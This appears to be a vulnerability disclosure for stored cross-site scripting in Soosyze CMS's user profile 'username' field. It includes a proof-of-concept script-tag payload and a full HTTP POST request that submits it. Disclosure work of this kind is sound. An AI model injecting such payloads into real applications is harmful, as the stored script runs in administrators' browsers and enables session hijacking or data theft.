# Soosyze CMS / Stored Cross Site Scripting


## Affected Component
> /user/X

## Impact
The web application is vulnerable to stored cross-site scripting (XSS) attacks within the view user functionality. Attackers can exploit this vulnerability by injecting malicious JavaScript code into the "username" parameter, which is used to view the username. When admin user views the username, the injected script executes within their browsers, potentially leading to various malicious activities such as session hijacking or data theft.

## Proof of Concept
To exploit the stored XSS vulnerability, attackers craft a payload containing malicious JavaScript code and inject it into the "username" parameter while editing the profile. For example, submitting the payload Jimmy <script>alert("XSS-JIMMY")</script> triggers an alert box when viewed. This demonstrates the successful execution of arbitrary scripts within the application.


**HTTP Request Example**
``` http request
POST /user/2 HTTP/1.1
Host:[REDACTED]
Content-Length: 1506
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjSBWfEdOV3GhGP1t
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
X-HTTP-Method-Override: put
Referer: [REDACTED]
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=[REDACTED]
Connection: close
------WebKitFormBoundaryjSBWfEdOV3GhGP1t
Content-Disposition: form-data; name="__method"
put
------WebKitFormBoundaryjSBWfEdOV3GhGP1t
Content-Disposition: form-data; name="username"
Jimmy <script>alert("XSS-JIMMY")</script>
------WebKitFormBoundaryjSBWfEdOV3GhGP1t
------WebKitFormBoundaryjSBWfEdOV3GhGP1t
Content-Disposition: form-data; name="submit"
Save
------WebKitFormBoundaryjSBWfEdOV3GhGP1t--
```
## Proof of Concept (POC):


## Screenshot
![image](https://github.com/dumiAron/CVE/assets/110510895/3d1ef10a-47dc-41e7-809e-07ce3ce1adc4)


## **Credits**
> [Aaron Wy](https://github.com/WyAaron)
